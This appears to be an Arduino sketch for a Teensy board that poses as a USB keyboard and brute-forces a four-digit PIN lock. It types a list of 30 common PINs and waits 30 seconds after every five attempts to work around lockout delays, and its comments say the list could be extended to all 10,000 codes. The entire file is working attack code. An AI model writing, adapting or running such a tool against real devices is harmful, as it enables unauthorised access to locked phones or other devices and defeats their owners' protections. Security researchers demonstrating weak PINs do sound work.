// -------------------------------------------------
// Teensy and variables setup
// ---------------------------------------------------
// Setting-up the Teensy 3 led.

const int ledPin = 13;
     
    // How many tries before waiting a bit?
int triesBeforeWaiting = 5;
    
    
    // How long before we start resuming the brute-force (in seconds);
    int waitBeforeContinue = 30;
    
    // ----------------------------------------------------
    // This is the PIN code array. For demo purposes we only uses 30
    // but we can store all 10,000 of them.
    // ----------------------------------------------------
    const char *pin[30] = { //---- 20 most used PIN codes ---
                           "1234", "1111", "0000", "1212", "7777",
                           "1004", "2000", "4444", "2222", "6969", 
                           "9999", "3333", "5555", "6666", "1122",
                           "1313", "8888", "4321", "2001", "1010",
                            //---- Patterns and known dates --
                           "1789", "1515", "1664", "1337", "0112",
                           "1945", "1418", "1984", "1515", "2020"
                         };
        
    // Flag to indicate if the PIN crack is finished or not
    int isFinished = 0;  // (For later use)
    void setup() {
        pinMode(ledPin, OUTPUT);
        delay(5000);
      }
    
    // ----------------------------------------------------
    // Main Function
    // ----------------------------------------------------
      
    void loop() {            // This is the main function
      int counter = 0;
      Keyboard.println();
      Keyboard.println();
      Keyboard.println(String(pin[0]));
      for (counter = 0 ; counter < 30 ; counter++) {
        ledOn();
        Keyboard.println(String(pin[counter])); // We send the PIN code
        delay(150);         
        ledOff();
        delay(4000);
        Keyboard.println(); 
        delay(1000);         
        if ((counter+1) % triesBeforeWaiting == 0) wait(); // every 5 PIN we wait 30s
       }
    }
   
   void ledOn() {        // Activates the onboard led
    digitalWrite(ledPin, HIGH);
   } 
   
   void ledOff() {        // Deactivates the onboard led
    digitalWrite(ledPin, LOW);
   } 
    
   void wait() {         // We wait 30 seconds and then press enter
        ledOn();
        delay(waitBeforeContinue*1000);
        Keyboard.println();
        delay(2000);
        ledOff();
   }